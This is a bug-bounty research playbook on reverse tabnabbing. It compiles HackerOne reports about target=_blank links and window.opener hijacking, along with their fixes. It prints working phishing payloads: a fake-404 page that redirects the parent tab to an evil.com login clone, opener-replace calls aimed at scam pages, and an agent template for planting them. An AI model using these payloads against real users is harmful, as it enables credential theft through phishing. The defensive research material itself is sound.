---
title: "Opener Control & Reverse Tabnabbing — target=_blank, window.opener, rel=noopener doctrine"
type: playbook
category: opener-control-tabnabbing
cwe: "CWE-1022"
source_count: 14
full_bodies_available: 14
corpus: "h1.security.nathan.sx roster (198 rows), bodies via hackerone.com/reports/<id>.json"
list_accessed: "2026-10-28"
note: "Anchor bodies: RDIR-23386 (HackerOne opener, $500 json), RDIR-211065 (GitLab reverse tabnabbing), RDIR-160498 (Coinbase Safari leak, $300 list). Claims trace to bodies read 2026-10-29."
---

# Opener Control & Reverse Tabnabbing — the redirect that happens in another tab

## 1. Overview

Fourteen cases: `target="_blank"` links let the opened page reach back and redirect the *original*
tab through `window.opener`. It is a redirect where the attacker never touches the URL — the
victim's own click on your (attacker-authored or attacker-influenced) link does everything.
Sub-families:

| Family | Cases |
|---|---|
| Opener hijack on target site (HackerOne) | 23386, 27987, 124620 |
| Attacker-influenced link sources (profiles, work samples) | 220737, 165136, 181088, 260278 |
| Reverse tabnabbing with phishing scenario (GitLab) | 211065, 212629, 213114 |
| Browser-divergence rows (Safari/WebKit) | 160498 |
| Cross-window via iframe/escape | 46818, 175085 |
| Hardening row (link-class hygiene) | 181225 |

## 2. The anchor — RDIR-23386 (HackerOne, $500 json)

The canonical statement of the mechanism ( sic "it's" preserved):

> When you open a link in a new tab ( target="_blank" ), the page that opens in a new tab can
> access the initial tab and change it's location using the window.opener property.

> The javascript code that does all the magic:
> window.opener.location.replace(newURL);

> I hope you see why this is dangerous: this method has huge potential for tricking
> hackerone.com that click on external links from this site to be a victim of a scam page because
> the redirecting is made in the background, while the user is focused on another tab.

> More then that, some browsers like Mozilla for Android don't even display the URL, just the page
> title, so the user has no way of knowing that he was redirected to a scam page.

> If an attacker uses this trick while submitting a bug on hackerone.com/someTarget, he may obtain
> the logon credentials for a representative of "someTarget" and gain access to his account,
> private reports submitted by other researchers etc.

Plus the fix, which the whole corpus standardizes on:

> 2. Set the window.opener attribute to null on the new tab before redirecting to the landing
> page, like this:
> a) open in a new tab hackerone.com/redirect?link=landingpage
> b) use a javascript code: `<script>window.opener = null; </script>`
> c) redirect to the landing page: `<script>window.location.reload(landingpage)</script>`

## 3. The phishing-scenario upgrade — RDIR-211065 (GitLab, low)

The body that turned tabnabbing from "trivial" into a demonstrated credential phish:

> I used some simple tricks to further increase the chances of this attack working. I added a link
> to a website which contains the following code:

*(the report's fenced code block, verbatim):*

> <!DOCTYPE html>
> <html>
> <head>
>     <title>404 Not Found</title>
> </head>
> <body>
>     <h1>Not Found</h1>
>     <p>The requested URL was not found on this server.</p>
>     <hr>
>     <address>Apache/2.2.15 (Red Hat) Server at gitlab.com Port 443</address>
>     <script>
>         window.opener.location.assign('https://evil.com/ph-login.html');
>     </script>
> </body>
> </html>

*(between them in the body: the closing fence and the {F166662} attachment marker — elided)*

> The new tab displays a 404 page which increases the likelihood that the victim will return to
> the previous tab. While the victim visited the attacker's page, the initial tab was redirected
> to `https://evil.com/ph-login.html`. This page looks exactly like the GitLab login form and asks
> the victim to re-enter their login credentials.

**The 404-disguise trick is the module's most reusable technique** — the opened tab looks broken,
so the victim returns to the tab that was just hijacked mid-redirect.

## 4. Parser-bypass variant — RDIR-212629 (GitLab #2, medium)

> By creating a link with `https://[REDACTED_EMAIL]` the parser ignores it and does not add
> the usual `rel="nofollow noreferrer"` which is located on all other links.

The external-link filter misclassifies the @-authority URL as internal → no rel attributes →
tabnabbing. The @-authority trick (module 01) doubles as a rel-stripper.

- **RDIR-213114 (#3, medium)** — AsciiDoc `[text^]` renders `target="_blank"` without rel.

## 5. Browser-divergence — RDIR-160498 (Coinbase, $300 list)

Team-summary body, the WebKit subtlety:

> Although Coinbase cleared window.opener on external redirects, it was not effective on
> WebKit-based browsers (Safari) since Safari's cross-origin security prevents the modification of
> window.opener of a child window if it lies on a different origin, yet still allows the child
> window to access window.opener.location.
> The solution, proposed by the reporter, was to add rel="noreferrer noopener" to these external
> links.

**`window.opener = null` is not a complete fix on WebKit** — `rel="noopener noreferrer"` is.

## 6. Attacker-influenced link sources

- **RDIR-27987 (HackerOne profile website field, $500 list)** — profile links as the delivery
  (fix-bypass of 23386).
- **RDIR-220737 (Mavenlink work sample, $50 list)** — work-sample website field;
  `window.opener.location.replace('http://daniel-tomescu.com/hackerone/scampage.php');`
- **RDIR-165136 (mapbox editor, informative)** — "This allows me to replace the user's legitimate
  mapbox.com session with my own Mapbox phishing form".
- **RDIR-181088 (coinbase, $100 json)** — external_redirect flow + http Bloomberg link.
- **RDIR-260278 (LegalRobot UAT, $20 list)** — plain `target=_blank` no-rel row.
- **RDIR-124620 (HackerOne issue-tracker links)** — the reporter's own honest impact math, verbatim:
  > As can be seen the attack scenario is pretty small :-)
  two pre-requirements spelled out in the body (adversary escalates a report into an external
  tracker + controls that tracker's response); and the donation line:
  > *If you believe this warrants a bounty please donate it to
  > [Médecins Sans Frontières](http://www.msf.org/)*.
- **RDIR-181225 (ParagonIE Airship)** — source-level hygiene row (four code paths listed).
- **RDIR-175085 (Nextcloud mail)** — scheme-filter gap adds `target=_blank` to links → opener
  control + content spoof + accountID leak.
- **RDIR-46818 (Twitter Card, $560 json)** — iframe escape:
  > Javascript that I used on Twitter Card :
  > `<script>top.window.location.href="https://google.com.tr"</script>`

## 7. Agent execution template

```text
P0 — inventory: grep rendered HTML for target="_blank" without rel*=noopener; check outbound
     links from authenticated pages (issue trackers, CVE links, profile fields, work samples).
P1 — delivery: any surface where the victim opens YOUR link (attacker profile fields, uploaded
     content, comments with links).
P2 — payload on the opened page:
     window.opener.location.replace('https://evil.com/phish');
     Plus the 211065 disguise: fake-404 wrapper page, then hijack.
P3 — browser matrix: Chrome (patched opener since 2017-era), Safari/WebKit (160498 gap),
     Firefox mobile (no URL bar display — 23386).
P4 — fix-check: window.opener=null alone is incomplete on WebKit; require rel="noopener noreferrer".
```

## 8. Validation gates

1. The parent-tab location change shown on video or recording — this bug is invisible in static
   requests.
2. The victim-visible URL/state shown post-hijack (fake login page with target branding).
3. Link-source control proven (your profile field, your uploaded content, or the site's own
   outbound links).
4. Impact argued through the specific flow that got hijacked (login, OAuth confirm, admin action).

## 9. Adjacency

- Same cross-window family as 46818's `top.window.location` iframe escape — the module boundary
  with module 06 is the *emission context* (new-tab vs iframe).
- Era discipline: `rel="noopener"` became browser-default for `target=_blank` anchors in 2021
  (Chrome 88+/WebView patch era) — playbook P4 fingerprints this before payload work; post-2017
  tabnabbing reports are bibliography-only (§2/§3 of the blogs-index).

## 10. Archive-label honesty

- 3 json ($500, $560, $100), 4 list ($500, $300, $50, $20), 7 untagged. The untagged majority is
  the hardening era — teams patched without paying.
- 175085's opener-control claim is one of three impacts in a multi-bug report; the register keeps
  it here because the opener control is the demonstrated cross-window effect.

## 11. Cross-references

- Module 06 (emission-context boundary), `../CSRF/07_Chains-Commerce-Impact.md` (delivery lanes).
- The canonical external references the corpus bodies cite (mathiasbynens rel-noopener demo,
  jitbit "target=_blank — the most underestimated vulnerability ever") live in the *bodies* of
  RDIR-124620/175085/211065/212629, not in the §2 blog index — the extracted bugbountyhunting
  corpus has no noopener/tabnabbing writeup.
